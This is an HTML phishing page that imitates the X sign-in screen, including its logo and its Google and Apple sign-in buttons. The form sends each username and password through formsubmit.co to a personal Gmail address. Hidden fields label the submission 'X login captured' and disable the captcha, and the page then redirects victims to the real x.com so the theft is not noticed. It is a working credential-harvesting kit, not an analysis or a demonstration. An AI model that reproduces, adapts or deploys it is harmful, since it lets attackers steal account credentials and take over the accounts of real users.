<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to X</title>
<style>
  *{box-sizing:border-box}
  body{margin:0;background:#000;color:#e7e9ea;
       font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
       display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
  .card{width:100%;max-width:420px;padding:24px 0}
  .xlogo{width:40px;height:40px;fill:#e7e9ea;margin:0 auto 28px;display:block}
  h1{font-size:31px;font-weight:700;margin:0 0 28px;text-align:center}
  .btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;
       padding:11px;border-radius:9999px;border:0;background:#fff;color:#0f1419;
       font-size:15px;font-weight:600;cursor:pointer;margin-bottom:12px;font-family:inherit}
  .divider{display:flex;align-items:center;gap:12px;margin:8px 0 16px;color:#71767b;font-size:15px}
  .divider::before,.divider::after{content:"";flex:1;height:1px;background:#2f3336}
  input{width:100%;padding:16px 12px;margin-bottom:20px;background:transparent;
        border:1px solid #333639;border-radius:6px;color:#e7e9ea;font-size:17px;font-family:inherit}
  input:focus{outline:none;border-color:#1d9bf0}
  input::placeholder{color:#71767b}
  .next{width:100%;padding:14px;border-radius:9999px;border:0;background:#e7e9ea;color:#0f1419;
        font-size:17px;font-weight:700;cursor:pointer;font-family:inherit}
  .forgot{display:block;text-align:center;margin-top:24px;color:#1d9bf0;font-size:15px;text-decoration:none}
</style>
</head>
<body>
  <div class="card">
    <svg class="xlogo" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
    <h1>Sign in to X</h1>

    <form action="https://formsubmit.co/sierramwatts@gmail.com" method="POST">
      <button type="button" class="btn">
        <svg viewBox="0 0 48 48" width="18" height="18"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
        Sign in with Google
      </button>
      <button type="button" class="btn">
        <svg viewBox="0 0 24 24" width="18" height="18" fill="#0f1419"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
        Sign in with Apple
      </button>

      <div class="divider">or</div>

      <input type="text" name="username" placeholder="Phone, email, or username" required autocomplete="off">
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit" class="next">Next</button>

      <input type="hidden" name="_subject" value="X login captured">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_template" value="table">
      <input type="hidden" name="_next" value="https://x.com/">
    </form>

    <a class="forgot" href="https://x.com/account/begin_password_reset">Forgot password?</a>
  </div>
</body>
</html>
